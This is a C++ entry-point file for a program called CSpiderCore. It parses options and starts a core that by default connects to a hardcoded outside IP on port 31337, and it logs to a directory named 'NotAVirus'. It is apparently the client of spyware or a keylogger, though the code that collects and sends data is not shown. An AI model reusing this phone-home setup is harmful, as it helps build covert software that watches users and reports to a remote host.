//
// Created by roman sztergbaum on 27/09/2017.
//

#include <iostream>
#include <Core/CSpiderCore.hpp>
#include <string>
#include <boost/exception/diagnostic_information.hpp>
#include <boost/program_options.hpp>
#include "Configuration.hpp"

namespace opt = boost::program_options;

static bool fill_conf(spi::cfg::Config &conf, const opt::variables_map &vm) noexcept
{
    conf.port = vm["port"].as<unsigned short>();
    conf.portAcceptor = vm["port-acceptor"].as<unsigned short>();
    conf.address = vm["address"].as<std::string>();
    conf.logDir = vm["log-dir"].as<std::string>();
    conf.certFile = vm["cert-file"].as<std::string>();
    conf.keyFile = vm["key-file"].as<std::string>();
    conf.retryTime = vm["retry-time"].as<long>();
    return true;
}

int main(int ac, char **av)
{
    opt::options_description desc("Available options");

    desc.add_options()
        ("port", opt::value<unsigned short>()->default_value(31337), "the port on which to connect")
        ("port-acceptor", opt::value<unsigned short>()->default_value(31300), "the port at which to listen")
        ("address", opt::value<std::string>()->default_value("79.137.42.80"))
        ("log-dir", opt::value<std::string>()->default_value("NotAVirus"))
        ("cert-file", opt::value<std::string>()->default_value("cert.pem"))
        ("key-file", opt::value<std::string>()->default_value("key.pem"))
        ("retry-time", opt::value<long>()->default_value(20))
        ("help", "display this help message");

    opt::variables_map vm;

    try {
        opt::store(opt::parse_command_line(ac, (const char *const *)av, desc), vm);
        opt::notify(vm);
    } catch (const std::exception &e) {
        std::cerr << e.what() << std::endl;
        return 1;
    }

    if (!vm["help"].empty()) {
        std::cout << desc << std::endl;
        return 0;
    }

    spi::cfg::Config conf;
    if (!fill_conf(conf, vm)) {
        std::cerr << "Invalid configuration !" << std::endl;
        return 1;
    }

    try {
        spi::CSpiderCore core(conf);
        if (!core.setup())
            return 1;
        core.run();
    }
    catch (const std::exception &error) {
        std::cerr << error.what() << std::endl;
    }
    return 0;
}